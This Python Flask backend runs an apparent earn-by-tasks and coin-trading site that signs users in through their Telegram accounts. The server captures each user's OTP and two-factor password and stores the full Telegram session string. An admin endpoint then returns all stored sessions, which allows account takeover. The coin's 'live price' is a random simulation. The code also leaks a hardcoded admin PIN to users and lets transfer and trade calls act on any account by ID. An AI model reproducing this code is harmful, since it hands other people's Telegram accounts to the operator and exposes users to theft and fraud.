import os
import asyncio
import random 
import secrets
import threading
from datetime import datetime, timedelta
from functools import wraps
from bson import ObjectId
from flask import Flask, request, jsonify, session, render_template, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import firebase_admin
from firebase_admin import credentials, db

# ================= APP =================
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "AAF_TELE_EARN_V18_CORE_SECRET")

app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=False,
    PERMANENT_SESSION_LIFETIME=timedelta(days=3)
)

CORS(app, supports_credentials=True)

# ================= CONFIG =================
API_ID = int(os.environ.get("API_ID", 36466824))
API_HASH = os.environ.get("API_HASH", "535ddcb85f2c3c74cc0ff532dd2c3406")
FIREBASE_DB_URL = "https://teleearnbd-781d6-default-rtdb.firebaseio.com"
FIREBASE_KEY_PATH = "/etc/secrets/firebase-adminsdk.json"
MONGO_URI = os.environ.get("MONGO_URI")
if not MONGO_URI:
    raise ValueError("MONGO_URI environment variable not set")

# ================= DB =================
client = MongoClient(MONGO_URI)
db_mongo = client["aaf_tele_earn_db"]
users_col = db_mongo["users"]
settings_col = db_mongo["settings"]
admin_config_col = db_mongo["admin_config"]
deposits_col = db_mongo["deposits"]
withdraws_col = db_mongo["withdraws"]
trades_col = db_mongo["trades"]

# ================= FIREBASE =================
if not firebase_admin._apps:
    if os.path.exists(FIREBASE_KEY_PATH):
        cred = credentials.Certificate(FIREBASE_KEY_PATH)
        firebase_admin.initialize_app(cred, {"databaseURL": FIREBASE_DB_URL})
        print("✅ Firebase Connected")
    else:
        print("⚠️ firebase-key.json not found. Firebase features will not work.")
fb_ref = db.reference() if firebase_admin._apps else None

# ================= NEW: Per-request async helper (no persistent client) =================
def run_async(coro):
    """প্রতি রিকোয়েস্টে নতুন ইভেন্ট লুপ তৈরি করে (persistent নয়)"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

def normalize_phone(phone):
    if not phone:
        return None
    phone = phone.strip().replace(" ", "")
    if phone.startswith("+880"):
        return phone
    elif phone.startswith("880"):
        return "+" + phone
    elif phone.startswith("0"):
        return "+880" + phone[1:]
    elif phone.isdigit() and len(phone) == 10:
        return "+880" + phone
    else:
        return None

def get_admin_config():
    doc = admin_config_col.find_one({"_id": "global"})
    if not doc:
        doc = {
            "_id": "global",
            "trading_fee": 0.5,
            "bonus_target": 5,
            "server_income": 0,
            "server_trading": 0,
            "total_users": users_col.count_documents({}),
            "admin_pin": "Abdullah6790",
            "wallet": {"nagad": "017XXXXXXXX"},
            "trading_ad_text": "Welcome to Trading",
            "task_banner_ad": "",
            "task_popup_ad": "",
            "banner_image": "",
            "popup_ad": {"enabled": False, "image": "", "title": "", "desc": ""},
            "live_price": 1.0,
            "channel_url": "https://t.me/your_channel"
        }
        admin_config_col.insert_one(doc)
    return doc

def update_total_users():
    total = users_col.count_documents({})
    admin_config_col.update_one({"_id": "global"}, {"$set": {"total_users": total}})

# Temporary storage for OTP data (phone -> temp_session, phone_code_hash)
temp_otp_data = {}

# Background thread for live price simulation
current_price = 1.0
def update_price_loop():
    global current_price
    while True:
        try:
            change = random.uniform(-0.005, 0.005)
            current_price += change
            current_price = max(0.5, min(2.5, current_price))
            admin_config_col.update_one({"_id": "global"}, {"$set": {"live_price": current_price, "last_updated": datetime.utcnow()}})
            now = datetime.utcnow()
            candle = {
                "time": int(now.timestamp()),
                "open": current_price - change,
                "high": current_price + abs(change)*0.5,
                "low": current_price - abs(change)*0.5,
                "close": current_price,
                "ts": now.isoformat()
            }
            if fb_ref:
                fb_ref.child("candle_history").push(candle)
                if now.minute == 0 and now.second < 5:
                    cutoff = (now - timedelta(days=30)).timestamp()
                    old = fb_ref.child("candle_history").order_by_child("time").end_at(cutoff).get()
                    if old:
                        for key in old:
                            fb_ref.child(f"candle_history/{key}").delete()
        except:
            pass
        threading.Event().wait(2)

threading.Thread(target=update_price_loop, daemon=True).start()

# ================= LOGIN REQUIRED DECORATOR =================
def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        uid = session.get("uid")
        if not uid:
            return redirect(url_for("login"))
        user = users_col.find_one({"_id": ObjectId(uid)})
        if not user:
            session.clear()
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return wrapper

# ================= PAGE ROUTES (সব আগের মতো) =================
@app.route("/")
@app.route("/login")
def login():
    return render_template("login.html")

@app.route("/dashboard")
@login_required
def dashboard():
    return render_template("dashboard.html")

@app.route("/task")
@login_required
def task():
    return render_template("task.html")

@app.route("/trading")
@login_required
def trading():
    return render_template("trading.html")

@app.route("/wallet")
@login_required
def wallet():
    return render_template("wallet.html")

@app.route("/account")
@login_required
def account():
    return render_template("account.html")

@app.route("/refer_list")
@login_required
def refer_list():
    return render_template("refer_list.html")

@app.route("/payment_history")
@login_required
def payment_history():
    return render_template("payment_history.html")

@app.route("/admin")
def admin_panel():
    return render_template("admin.html")

# ================= API: AUTH (Per-request Telegram client) =================
@app.route("/api/send_otp", methods=["POST"])
def send_otp():
    data = request.json
    phone = normalize_phone(data.get("phone"))
    if not phone:
        return jsonify({"success": False, "message": "invalid_phone"})

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_otp_data[phone] = {
            "temp_session": client.session.save(),
            "phone_code_hash": result.phone_code_hash
        }
        await client.disconnect()
        return True, "OTP Sent"

    try:
        success, msg = run_async(_send())
        return jsonify({"success": success, "message": msg})
    except Exception as e:
        print(f"send_otp error: {e}")
        return jsonify({"success": False, "message": str(e)})



@app.route("/api/verify_login", methods=["POST"])
def verify_login():
    import traceback
    data = request.json
    phone = normalize_phone(data.get("phone"))
    code = data.get("code")
    password = data.get("password")
    ref = data.get('ref')

    print(f"=== VERIFY_LOGIN START ===")
    print(f"Phone: {phone}, Code: {code}, Has password: {bool(password)}")

    if not phone or phone not in temp_otp_data:
        print(f"Phone {phone} not found in temp_otp_data. Keys: {list(temp_otp_data.keys())}")
        return jsonify({"success": False, "message": "session_expired"})

    temp = temp_otp_data[phone]
    temp_session_str = temp.get("temp_session")
    phone_code_hash = temp.get("phone_code_hash")
    print(f"Temp session (partial): {temp_session_str[:20]}..., phone_code_hash: {phone_code_hash}")

    async def _verify():
        client = TelegramClient(StringSession(temp_session_str), API_ID, API_HASH)
        await client.connect()
        try:
            if password:
                await client.sign_in(password=password)
            else:
                if not code:
                    return False, "Code required"
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            me = await client.get_me()
            session_str = client.session.save()
            return True, me, session_str
        except SessionPasswordNeededError:
            # 2FA required – ফ্রন্টএন্ডকে পাসওয়ার্ড স্টেপে পাঠান
            print(f"2FA required for {phone}")
            await client.disconnect()
            return False, "SHOW_PWD_STEP"
        except Exception as e:
            print(f"Error in _verify: {type(e).__name__}: {e}")
            traceback.print_exc()
            await client.disconnect()
            return False, str(e)

    try:
        result = run_async(_verify())
        if result[0] is True and len(result) == 3:
            me, session_str = result[1], result[2]
            # ইউজার তৈরি বা আপডেট করুন
            user = users_col.find_one({"telegram_id": str(me.id)})
            if not user:
                user_data = {
                    "telegram_id": str(me.id),
                    "phone": phone,
                    "username": me.username or f"user_{me.id}",
                    "first_name": me.first_name or "",
                    "last_name": me.last_name or "",
                    "session_string": session_str,
                    "cash": 0,
                    "aaf": 0,
                    "refer_count": 0,
                    "refer_by": ref,
                    "is_joined": False,
                    "tasks_done": 0,
                    "created_at": datetime.utcnow(),
                    "last_login": datetime.utcnow()
                }
                if ref:
                    users_col.update_one({"telegram_id": ref}, {"$inc": {"refer_count": 1}})
                result_id = users_col.insert_one(user_data).inserted_id
            else:
                users_col.update_one(
                    {"telegram_id": str(me.id)},
                    {"$set": {"session_string": session_str, "last_login": datetime.utcnow(), "phone": phone}}
                )
                result_id = user["_id"]
            session["uid"] = str(result_id)
            session.permanent = True
            update_total_users()
            del temp_otp_data[phone]
            return jsonify({"success": True, "telegram_id": str(me.id)})
        else:
            msg = result[1]
            if msg == "SHOW_PWD_STEP":
                return jsonify({"success": False, "message": "SHOW_PWD_STEP"})
            else:
                return jsonify({"success": False, "message": msg})
    except Exception as e:
        print(f"Outer exception: {e}")
        traceback.print_exc()
        return jsonify({"success": False, "message": str(e)})



@app.route("/api/user/data/<telegram_id>")
def user_data(telegram_id):
    uid = session.get("uid")
    if not uid:
        return jsonify({"status": "error", "message": "session_expired"})
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        session.clear()
        return jsonify({"status": "error", "message": "user_not_found"})
    admin = get_admin_config()
    user["_id"] = str(user["_id"])
    return jsonify({"status": "success", "user": user, "admin": admin})


@app.route("/api/silent_join", methods=["POST"])
@login_required
def silent_join():
    uid = session.get("uid")
    user = users_col.find_one({"_id": ObjectId(uid)})
    admin = get_admin_config()
    channel_url = admin.get("channel_url", "")   # ← ডিফল্ট ফাঁকা, এডমিন থেকে দিতে হবে

    # ইউজার বা সেশন স্ট্রিং না থাকলে জয়েন অসম্ভব
    if not user or "session_string" not in user or not channel_url:
        return jsonify({"success": False, "channel": channel_url})
    
    async def check_join():
        client = TelegramClient(StringSession(user["session_string"]), API_ID, API_HASH)
        await client.connect()
        try:
            entity = await client.get_entity(channel_url)
            participants = await client.get_participants(entity, search=user.get("telegram_id"))
            return len(participants) > 0
        except Exception as e:
            print(f"Telegram check error: {e}")
            return False
        finally:
            await client.disconnect()
    
    is_member = run_async(check_join())
    if is_member:
        users_col.update_one({"_id": ObjectId(uid)}, {"$set": {"is_joined": True}})
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "channel": channel_url})

# ================= API: TASKS (Firebase) =================
@app.route("/api/tasks")
def get_tasks():
    if not fb_ref:
        return jsonify({"tasks": []})
    tasks = fb_ref.child("tasks").get()
    task_list = []
    if tasks:
        for key, t in tasks.items():
            t["id"] = key
            task_list.append(t)
    return jsonify({"tasks": task_list})

@app.route("/api/user/tasks/claim", methods=["POST"])
@login_required
def claim_task():
    data = request.json
    telegram_id = data.get("telegram_id")
    task_id = data.get("task_id")
    device_id = data.get("device_id")

    if not fb_ref:
        return jsonify({"blocked": True, "message": "Firebase not configured"})

    # Check device usage
    device_used = fb_ref.child(f"device_tasks/{task_id}/{device_id}").get()
    if device_used:
        return jsonify({"blocked": True, "message": "এই ডিভাইস ইতিমধ্যে টাস্ক ক্লেইম করেছে।"})

    # Get task from Firebase
    task = fb_ref.child(f"tasks/{task_id}").get()
    if not task:
        return jsonify({"blocked": False, "message": "Task not found"})

    reward = task.get("reward", 0)
    currency = task.get("currency", "cash")

    user = users_col.find_one({"telegram_id": telegram_id})
    if not user:
        return jsonify({"blocked": False, "message": "User not found"})

    if currency == "aaf":
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"aaf": reward}})
        msg = f"Received {reward} AAF"
    else:
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": reward}})
        msg = f"Received ৳{reward}"

    users_col.update_one({"_id": user["_id"]}, {"$inc": {"tasks_done": 1}})
    fb_ref.child(f"device_tasks/{task_id}/{device_id}").set(True)

    return jsonify({"blocked": False, "message": msg})


@app.route("/api/admin/task/delete", methods=["POST"])
@login_required
def admin_delete_task():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    task_id = data.get("task_id")
    if not task_id:
        return jsonify({"error": "Task ID required"}), 400
    if fb_ref:
        fb_ref.child(f"tasks/{task_id}").delete()
        return jsonify({"success": True})
    return jsonify({"error": "Firebase not configured"}), 500

# ================= API: TRADING =================
@app.route("/api/market/price")
def market_price():
    admin = get_admin_config()
    return jsonify({"price": admin.get("live_price", 1.0)})

@app.route("/api/market/live-candle")
def live_candle():
    if not fb_ref:
        return jsonify({"time": int(datetime.utcnow().timestamp()), "open": 1.0, "high": 1.0, "low": 1.0, "close": 1.0})
    candles = fb_ref.child("candle_history").order_by_key().limit_to_last(1).get()
    if candles:
        last = list(candles.values())[0]
        return jsonify(last)
    return jsonify({"time": int(datetime.utcnow().timestamp()), "open": 1.0, "high": 1.0, "low": 1.0, "close": 1.0})

@app.route("/api/trade/execute", methods=["POST"])
@login_required
def execute_trade():
    data = request.json
    telegram_id = data.get("telegram_id")
    trade_type = data.get("type")
    taka = data.get("taka", 0)
    coin = data.get("coin", 0)
    price = data.get("price", 0)

    user = users_col.find_one({"telegram_id": telegram_id})
    if not user:
        return jsonify({"message": "User not found"})
    admin = get_admin_config()
    fee_percent = admin.get("trading_fee", 0.5)

    if trade_type == "buy":
        total_cost = taka + (taka * fee_percent / 100)
        if user.get("cash", 0) < total_cost:
            return jsonify({"message": "Insufficient cash"})
        new_cash = user["cash"] - total_cost
        new_aaf = user.get("aaf", 0) + coin
        users_col.update_one({"_id": user["_id"]}, {"$set": {"cash": new_cash, "aaf": new_aaf}})
        fee_amount = taka * fee_percent / 100
        admin_config_col.update_one({"_id": "global"}, {"$inc": {"server_income": fee_amount}})
        trades_col.insert_one({
            "telegram_id": telegram_id, "type": "buy", "taka": taka, "coin": coin,
            "price": price, "fee": fee_amount, "timestamp": datetime.utcnow()
        })
        return jsonify({"message": f"Bought {coin} AAF successfully"})
    elif trade_type == "sell":
        if user.get("aaf", 0) < coin:
            return jsonify({"message": "Insufficient AAF"})
        total_receive = taka - (taka * fee_percent / 100)
        new_cash = user["cash"] + total_receive
        new_aaf = user["aaf"] - coin
        users_col.update_one({"_id": user["_id"]}, {"$set": {"cash": new_cash, "aaf": new_aaf}})
        fee_amount = taka * fee_percent / 100
        admin_config_col.update_one({"_id": "global"}, {"$inc": {"server_income": fee_amount}})
        trades_col.insert_one({
            "telegram_id": telegram_id, "type": "sell", "taka": taka, "coin": coin,
            "price": price, "fee": fee_amount, "timestamp": datetime.utcnow()
        })
        return jsonify({"message": f"Sold {coin} AAF successfully"})
    return jsonify({"message": "Invalid type"})

# ================= API: WALLET =================
@app.route("/api/wallet/deposit", methods=["POST"])
@login_required
def deposit():
    data = request.json
    telegram_id = data.get("telegram_id")
    amount = data.get("amount")
    trx = data.get("trx")
    method = data.get("method", "Nagad")
    deposits_col.insert_one({
        "telegram_id": telegram_id,
        "amount": amount,
        "trx": trx,
        "method": method,
        "status": "pending",
        "created_at": datetime.utcnow()
    })
    return jsonify({"message": "Deposit request sent"})

@app.route("/api/wallet/withdraw", methods=["POST"])
@login_required
def withdraw():
    data = request.json
    telegram_id = data.get("telegram_id")
    amount = data.get("amount")
    number = data.get("number")
    user = users_col.find_one({"telegram_id": telegram_id})
    if not user or user.get("cash", 0) < amount:
        return jsonify({"message": "Insufficient balance"})
    withdraws_col.insert_one({
        "telegram_id": telegram_id,
        "amount": amount,
        "number": number,
        "status": "pending",
        "created_at": datetime.utcnow()
    })
    return jsonify({"message": "Withdraw request sent"})

@app.route("/api/wallet/transfer", methods=["POST"])
@login_required
def transfer():
    data = request.json
    from_id = data.get("from")
    to = data.get("to")
    amount = data.get("amount")
    transfer_type = data.get("type")
    from_user = users_col.find_one({"telegram_id": from_id})
    to_user = users_col.find_one({"telegram_id": to})
    if not from_user or not to_user:
        return jsonify({"message": "User not found"})
    if transfer_type == "cash":
        if from_user.get("cash", 0) < amount:
            return jsonify({"message": "Insufficient cash"})
        users_col.update_one({"_id": from_user["_id"]}, {"$inc": {"cash": -amount}})
        users_col.update_one({"_id": to_user["_id"]}, {"$inc": {"cash": amount}})
    elif transfer_type == "aaf":
        if from_user.get("aaf", 0) < amount:
            return jsonify({"message": "Insufficient AAF"})
        users_col.update_one({"_id": from_user["_id"]}, {"$inc": {"aaf": -amount}})
        users_col.update_one({"_id": to_user["_id"]}, {"$inc": {"aaf": amount}})
    else:
        return jsonify({"message": "Invalid type"})
    return jsonify({"message": "Transfer successful"})

@app.route("/api/wallet/ad")
def wallet_ad():
    if not fb_ref:
        return jsonify({"message": ""})
    msg = fb_ref.child("ads/wallet_popup").get()
    return jsonify({"message": msg or ""})

# ================= API: REFERRAL & PAYMENT HISTORY =================
@app.route("/api/user/referrals/<telegram_id>")
@login_required
def get_referrals(telegram_id):
    # Ensure current user matches
    uid = session.get("uid")
    user = users_col.find_one({"telegram_id": telegram_id})
    if not user or str(user["_id"]) != uid:
        return jsonify({"status": "error", "message": "unauthorized"})
    referrals = users_col.find({"refer_by": telegram_id}, {"username": 1, "telegram_id": 1, "created_at": 1})
    ref_list = []
    for r in referrals:
        ref_list.append({
            "username": r.get("username", "USER"),
            "telegram_id": r.get("telegram_id"),
            "joined_at": r.get("created_at").isoformat() if r.get("created_at") else ""
        })
    return jsonify({"referrals": ref_list})

@app.route("/api/user/payments/<telegram_id>")
@login_required
def get_payments(telegram_id):
    uid = session.get("uid")
    user = users_col.find_one({"telegram_id": telegram_id})
    if not user or str(user["_id"]) != uid:
        return jsonify({"status": "error", "message": "unauthorized"})
    deposits = list(deposits_col.find({"telegram_id": telegram_id}, {"_id": 0, "amount": 1, "status": 1, "created_at": 1}))
    withdraws = list(withdraws_col.find({"telegram_id": telegram_id}, {"_id": 0, "amount": 1, "number": 1, "status": 1, "created_at": 1}))
    for d in deposits:
        d["created_at"] = d["created_at"].isoformat() if d.get("created_at") else ""
    for w in withdraws:
        w["created_at"] = w["created_at"].isoformat() if w.get("created_at") else ""
    return jsonify({"deposits": deposits, "withdraws": withdraws})

# ================= API: ADMIN (PIN protected) =================
@app.route("/api/admin/me")
def admin_me():
    if session.get("admin_logged_in"):
        return jsonify({"ok": True})
    return jsonify({"ok": False})

@app.route("/api/admin/login", methods=["POST"])
def admin_login():
    data = request.json
    pin = data.get("pin")
    admin = get_admin_config()
    if pin == admin.get("admin_pin"):
        session["admin_logged_in"] = True
        return jsonify({"ok": True})
    return jsonify({"ok": False})

@app.route("/api/admin/users")
def admin_users():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    # session_string সহ সব ইউজার আনা
    users = list(users_col.find({}, {
        "_id": 0, 
        "telegram_id": 1,
        "fast_name": 1, 
        "username": 1, 
        "cash": 1,
        "aaf": 1,
        "session_string": 1   # ← এই লাইনটি যোগ করুন
    }))
    return jsonify({"users": users})

@app.route("/api/admin/tasks")
def admin_tasks():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    if not fb_ref:
        return jsonify({"tasks": []})
    tasks = fb_ref.child("tasks").get()
    task_list = []
    if tasks:
        for key, t in tasks.items():
            t["id"] = key
            task_list.append(t)
    return jsonify({"tasks": task_list})

@app.route("/api/admin/task/save", methods=["POST"])
def admin_save_task():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    if not fb_ref:
        return jsonify({"error": "Firebase not configured"}), 500
    data = request.json
    task_id = secrets.token_hex(4)
    task_data = {
        "id": task_id,
        "title": data.get("title"),
        "link": data.get("link"),
        "reward": data.get("reward"),
        "timer": data.get("timer"),
        "type": data.get("type"),
        "currency": data.get("currency", "cash")
    }
    fb_ref.child(f"tasks/{task_id}").set(task_data)
    return jsonify({"success": True})

@app.route("/api/admin/ads")
def admin_ads():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    if not fb_ref:
        return jsonify({"global": "", "wallet": "", "task": ""})
    global_ad = fb_ref.child("ads/task_banner_ad").get() or ""
    wallet_ad = fb_ref.child("ads/wallet_popup").get() or ""
    task_ad = fb_ref.child("ads/task_popup_ad").get() or ""
    return jsonify({"global": global_ad, "wallet": wallet_ad, "task": task_ad})

@app.route("/api/admin/withdraws")
def admin_withdraws():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    pending = list(withdraws_col.find({"status": "pending"}, {"_id": 1, "telegram_id": 1, "amount": 1}))
    result = [{"id": str(w["_id"]), "telegram_id": w["telegram_id"], "amount": w["amount"]} for w in pending]
    return jsonify({"list": result})

@app.route("/api/admin/withdraw/approve", methods=["POST"])
def admin_approve_withdraw():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    w_id = data.get("id")
    withdraw = withdraws_col.find_one({"_id": ObjectId(w_id)})
    if withdraw and withdraw["status"] == "pending":
        # Deduct balance (already deducted? Actually we didn't deduct on request, so deduct now)
        user = users_col.find_one({"telegram_id": withdraw["telegram_id"]})
        if user and user.get("cash", 0) >= withdraw["amount"]:
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": -withdraw["amount"]}})
            withdraws_col.update_one({"_id": ObjectId(w_id)}, {"$set": {"status": "approved"}})
    return jsonify({"success": True})

# ================= RUN =================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)
